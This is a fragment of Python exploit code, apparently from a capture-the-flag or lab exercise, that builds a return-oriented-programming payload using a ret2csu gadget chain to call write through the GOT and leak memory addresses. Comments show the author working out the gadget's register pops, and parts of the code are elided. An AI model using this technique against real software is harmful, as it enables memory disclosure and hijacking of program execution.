...
payload2 = b'J' * 8 
payload2 += p64(csu_pop) # ENTRY POINT for ROP

count = 0
for addr in addresses:
    # rbx=0, rbp=1, r12=got_write, r13=1, r14=addr, r15=2
...
# Clean exit
# The last csu_call returns to... pops next args.
# We provide junk args then exit.
# Actually csu_call pops args then returns.
# So we need args + address.
payload2 += p64(0) * 6
